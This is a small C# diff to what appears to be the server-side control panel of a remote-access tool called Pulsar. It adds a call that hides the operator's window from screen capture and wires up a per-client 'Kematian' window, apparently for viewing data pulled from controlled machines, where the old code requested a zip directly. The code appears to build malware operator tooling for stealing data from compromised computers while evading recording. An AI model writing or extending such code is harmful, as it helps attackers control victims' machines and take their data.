@@ -61,6 +61,7 @@ namespace Pulsar.Server.Forms
             RegisterMessageHandler();
             InitializeComponent();
             DarkModeManager.ApplyDarkMode(this);
+			ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);
             _discordRpc = new DiscordRPC.DiscordRPC(this);  // Initialize Discord RPC
             _discordRpc.Enabled = Settings.DiscordRPC;     // Sync with settings on startup
 
@@ -1331,8 +1332,10 @@ namespace Pulsar.Server.Forms
         {
             foreach (Client c in GetSelectedClients())
             {
-                var kematianHandler = new KematianHandler(c);
-                kematianHandler.RequestKematianZip();
+                var kematianHandler = new Messages.KematianHandler(c);
+                FrmKematian frmK = new FrmKematian(c, kematianHandler);
+                frmK.Show();
+                frmK.Focus();
             }
         }
 
